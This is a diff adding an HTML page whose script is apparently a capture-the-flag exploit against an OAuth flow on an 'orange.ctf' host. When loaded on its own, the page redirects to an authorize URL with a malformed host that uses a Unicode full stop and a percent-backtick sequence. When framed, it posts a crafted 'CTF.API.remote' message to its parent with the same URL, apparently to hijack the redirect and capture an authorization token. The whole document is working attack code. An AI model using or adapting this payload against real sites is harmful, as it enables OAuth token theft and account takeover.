@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <script type="text/javascript">
+        if (window.top == window.self) {
+            window.self.location.href = "https://example。com%`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
+        } else {
+            var data = JSON.stringify({
+                message: 'CTF.API.remote',
+                data: {
+                    location: "https://example。com%`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
+                }
+            });
+            window.parent.postMessage(
+                data, 
+                "https://example。com%`.orange.ctf"
+            );
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
